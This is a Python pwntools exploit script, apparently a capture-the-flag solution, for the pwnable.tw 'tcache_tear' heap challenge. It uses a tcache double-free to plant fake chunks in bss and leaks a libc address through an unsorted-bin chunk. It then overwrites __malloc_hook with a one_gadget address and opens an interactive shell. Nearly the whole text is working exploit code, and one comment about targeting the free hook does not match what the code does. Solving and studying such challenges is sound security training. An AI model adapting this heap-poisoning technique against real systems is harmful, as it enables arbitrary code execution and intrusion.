from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./tcache_tear")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./tcache_tear")
else:
    p = remote("chall.pwnable.tw",10207)
    libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
    elf = ELF("./tcache_tear")

def add(size,content):
    p.sendafter("Your choice :","1")
    p.sendafter("Size:",str(size))
    p.sendlineafter("Data:",content)
    p.recvuntil("Done !\n")

def free():
    p.sendafter("Your choice :","2")

def show():
    p.sendafter("Your choice :","3")

def debugf():
    gdb.attach(p,"b *0x400C0C")
context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
p.sendlineafter("Name:",p64(0) + p64(0x501))
#debugf()
# make the first fake chunk in bss
size = 0x70
add(size,"a")
free()
free()
add(size,p64(0x602060 + 0x500))
add(size,"a")
add(size,p64(0) + p64(0x21) + p64(0)*3 + p64(0x21))

# make the second fake chunk in bss
size = 0x60
add(size,"b")
free()
free()
add(size,p64(0x602070))
add(size,"a")
add(size,"\x00")
free()
show()
p.recvuntil("Name :")
p.recv(16)
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 96 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))

# change __malloc_hook will fail , thus change free_hook
size = 0x50
add(size,"a")
free()
free()
add(size,p64(libc.symbols["__malloc_hook"]))
add(size,"a")
debugf()
one_gadget = libc.address + 0x4f322
add(size,p64(one_gadget))
#add(size,p64(libc.symbols["system"]))
p.sendafter("Your choice :","1")
p.sendafter("Size:",str(0x10))
p.interactive()
